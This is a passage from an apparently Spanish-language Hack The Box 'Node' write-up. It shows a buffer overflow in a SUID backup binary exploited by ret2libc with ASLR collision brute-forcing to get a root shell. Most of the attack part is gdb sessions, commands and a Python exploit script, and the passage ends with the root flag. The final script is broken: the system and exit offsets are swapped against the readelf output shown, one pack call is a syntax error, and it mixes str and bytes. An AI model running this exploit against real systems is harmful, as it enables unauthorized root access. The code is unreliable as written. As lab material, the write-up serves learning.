45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
```

Para poder ver los registros al ejecutar el binario a bajo nivel usare `gdb`.

```bash
gef➤  r a 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python3 -c 'print("A"*3000)')
```

![](/assets/images/HTB/htb-writeup-Node/node9.PNG)


Vemos que se acontece el desbordamiento sobrescribiendo los registros y que alteran el flujo del programa, esto termina corrompiendolo cuando introducimos muchos caracteres capaces de sobrepasar el tamaño del buffer asignado.

![](/assets/images/HTB/htb-writeup-Node/buff.png)

Si quieres saber mas acerca de esto te dejo el siguiente articulo:

* [https://keepcoding.io/blog/que-es-un-buffer-overflow/](https://keepcoding.io/blog/que-es-un-buffer-overflow/)

Lo que podriamos hacer es que el flujo del programa podemos meterlo en la pila, donde a traves de un shellcode podemos ejecutar comandos y otorgarnos una reverse shell.

Pero si vemos las protecciones del binario este cuenta con  `data execution prevention`. `NX`.

```bash
gef➤  checksec
[+] checksec for '/home/fmiracle/Machines/Node/content/backup'
[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

Asi que necesitamos buscar otra forma de explotar del binario. Podemos usar un `ret2libc` que lo que hace es aprovecharse la la libreria `libc` que el binario esta utilizando. 

```bash
tom@node:/usr/local/bin$ which backup | xargs ldd
which backup | xargs ldd
	linux-gate.so.1 =>  (0xf7723000)
	libc.so.6 => /lib32/libc.so.6 (0xf7564000)
	/lib/ld-linux.so.2 (0xf7724000)
tom@node:/usr/local/bin$
```

Con ello en vez de mandar el flujo del programa a la pila, podemos usar el `libc` para ejecutar una llamada a nivel de sistema.


Para ello necesitamos primero saber si la maquina cuenta con `ÀSLR` `aleatorizacion de direcciones de la memoria`, ello podemos verificarlo leyendo.

```bash
cat /proc/sys/kernel/randomize_va_space
2
```

Al tener un valor de 2, quiere decir que la maquina si cuenta con `ASLR`.

Otra forma de verlo seria usando la siguente expresión, donde podemos ver que efectivamente cuenta con `ASLR` al cambiar las direcciones.


```bash
for i in $(seq 1 10); do which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
<ch backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()'; done  
0xf7553000
0xf752d000
0xf75a7000
0xf75bc000
0xf7579000
0xf7618000
0xf75ff000
0xf7613000
0xf7601000
0xf7556000
```

Pero pese a que exista `ASLR`, al no ser muy largas pueden repetirse, por tanto aunque sean aleatorios pueden volver a repetirse al haber una colision, podemos burlar el `ASLR`.


```bash
for i in $(seq 1 1000); do which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()' | grep 0xf752d000; done; break 
<grep libc | awk 'NF{print $NF}' | tr -d '()' | grep 0xf752d000; done; break 
0xf752d000
0xf752d000
0xf752d000
bash: break: only meaningful in a `for', `while', or `until' loop
```

Ahora para poder ejecutar un `ret2lib` y poder ejecutar una llamada a nivel de sistema necesitaremos:

- La dirección de system
- La dirección de exit 
- La dirección de la cadena `/bin/sh`

Basicamente lo que queremos lograr es `os.system("/bin/sh")` y al ser el binario `suid` lo hara como `root` y ganaremos acceso como este usuario.

Para ello primero debemos de saber de las `A` que insertamos antes cuantas debemos insertar para tener control del registro `eip`. Para lo cual podemos usar `pattern create` y generar un numero de cadena aleatoria.

```bash
gef➤  pattern create 1000
[+] Generating a pattern of 1000 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
[+] Saved as '$_gef0'
gef➤  
```

Insertamos la cadena generada.

![](/assets/images/HTB/htb-writeup-Node/node10.PNG)

Y ahora con `pattern offset` podemos saber cual es el limite para sobreescribir `eip`.

```bash
gef➤  patter offset $eip
[+] Searching for '$eip'
[+] Found at offset 512 (little-endian search) likely
[+] Found at offset 320 (big-endian search)
```

Vemos que necesitamos `512` caracteres antes de sobrescribir `eip`. Verificamos con la ayuda de python imprimiendo `512 A` y adicionamos `4 B`, que como resultado ahora el registro `eip` valdria `BBBB`.

![](/assets/images/HTB/htb-writeup-Node/node11.PNG)


Ahora que sabemos el offset lo siguiente sera encontrar las direcciones de system, exit y sh. Y para ello primero vamos a coger una dirección base de libc, puede ser cualquiera `0xf752d000`.

Teniendo esto podemos ir armandonos un script en python. Donde primero especificamos el offset de caracteres, debemos encontrar primero los offsets de las direcciones de `system, exit y binsh`. Ya que una vez tengamos estos podamos obtener las direcciones reales de estas usando la `libc_base + los offsets` de cada una.


Y usamos pack para representar las direcciones en `litelediam` y evitar darle la vuelta a las direcciones.


```python
#!/usr/bin/python3


from struct import pack

offset = 512

junk = "A"*offset

#ret2lib - EIP  -> system -> exit -> /bin/sh

libc_base_add = 0xf752d000

system_add_offset = 

exit_add_offset = 

binsh_add_offset = 


system_add_real = pack("<I", libc_base_add + system_add_offset )

exit_add_real = pack("<I", libc_base_add + exit_add_offset)

binsh_add_real = pack("<I"), libc_base_add + binsh_add_offset)


payload = junk + system_add_real + exit_add_real + binsh_add_real
```

Finalmente como payload deberiamos pasarle el junk sumado mas las direcciones reales de system, exit y binsh.

Ahora para conseguir los offset, primero usaremos `readelf` para las direcciones de `system y exit`.

```bash
readelf -s /lib32/libc.so.6 | grep -E " system@@| exit@@"
<adelf -s /lib32/libc.so.6 | grep -E " system@@| exit@@"                     
   141: 0002e7b0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
  1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```

Y para obtener el offset de binsh, podemos usar `strings` con los siguientes parametros:

```bash
strings -a -t x /lib32/libc.so.6 | grep "/bin/sh"
 15900b /bin/sh
```

Ahora solo debemos correr el programa multiples veces, para causar una colision en las direcciones hasta que `libc` valga lo que ejecutamos en el script.

```python
#!/usr/bin/python3


from struct import pack

offset = 512

junk = "A"*offset

#ret2lib - EIP  -> system -> exit -> /bin/sh

libc_base_add = 0xf752d000

system_add_offset = 0x0002e7b0

exit_add_offset = 0x0003a940

binsh_add_offset = 0x0015900b

system_add_real = pack("<I", libc_base_add + system_add_offset )

exit_add_real = pack("<I", libc_base_add + exit_add_offset)

binsh_add_real = pack("<I"), libc_base_add + binsh_add_offset)


payload = junk + system_add_real + exit_add_real + binsh_add_real

print(payload)
```

Ejecutamos el exploit multiples veces y se ejecuta la `/bin/sh` y ganamos acceso como el usuario `root`, ahora solo debemos dirigirnos al directorio personal del usuario `root` y visualizar la segunda flag `root.txt`.

```bash
while true; do backup a 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python exploit.py); done
```

```bash
# whoami
root
#cd /root
cat root.txt
98ef491742abffa14a62facb8d832818
```

